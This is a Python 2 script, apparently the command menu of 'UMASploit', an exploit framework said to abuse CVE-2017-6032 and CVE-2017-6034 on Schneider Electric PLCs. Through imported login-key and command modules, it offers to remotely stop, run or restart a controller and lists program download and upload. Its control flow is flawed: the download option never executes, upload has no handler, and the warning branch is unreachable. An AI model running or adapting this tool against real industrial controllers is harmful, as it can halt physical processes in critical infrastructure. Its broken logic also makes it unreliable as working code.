#!/usr/bin/env python

import os
from _UMASploit import ULKG
from _UMASploit import MRCT


__file__ = "UMASploit.py"
__project__ = "ClearEnergy - UMASploit"
__version__ = "1.0.1 Beta"
__description__ = "UMASploit framework developted to test if a remote PLC hardware device is vulnerable to CVE-2017-6032 and CVE-2017-6034 vulnerabilities (ClearEnergy) as documented in ICSA-17-101-01 (ICS-CERT Advisory) and SEVD-2017-065-01 (Schneider Electric Advisory). UMASploit combines the advantages of both vulnerabilities in order to a send remote administrative commands to a target PLCs."
__author__ = "CRITIFENCE, Critical Infrastructure and SCADA/ICS Cyber Threats Research Group"
__copyright__ = "COPYRIGHTS (c) 2017, CRITIFENCE"
__license__ = "GNU GPL 3.0"


banner = """\

+ ======================================================================================
+ ------------------  ClearEnergy | UMAS Login Key Generator (ULKG)  -------------------
+ ======================================================================================
+ Version: 1.0.1 Beta
+ Author: CRITIFENCE, Critical Infrastructure and SCADA/ICS Cyber Threats Research Group
+ Copyright: COPYRIGHTS (c) 2017, CRITIFENCE
+ ======================================================================================
"""



def select_command():
    os.system('cls')

    if True:
        print "\r\nPlease choose command from the list:"
        print "1. Stop PLC"
        print "2. Run PLC"
        print "3. Restart PLC"
        print "4. Download program to PLC"
        print "5. Upload program from PLC"
        print "0. Cancel"
        choice = raw_input(">>  ")
        command = choice

        if command == "4":
            choice = raw_input("Specify program data (hex)> ")
            command = choice
        if command == "0":
            print "[UMASploit] Command cancelled"
            exit()
        else:
            if command == "1":
                key = ULKG.start_ulkg()
                print str(key)
                output = MRCT.start_mrct(str(key), "STOP")
                print str(output)

            if command == "2":
                key = ULKG.start_ulkg()
                print str(key)
                output = MRCT.start_mrct(str(key), "RUN")
                print str(output)
            if command == "3":
                key = "N/A"
                output = MRCT.start_mrct(str(key), "RESTART")
                print str(output)

    else:
        print "[WARNING] Unable to fetch a valid session key"



if __name__ == '__main__':
    print banner
    select_command()
    print "[UMASploit] Completed!"




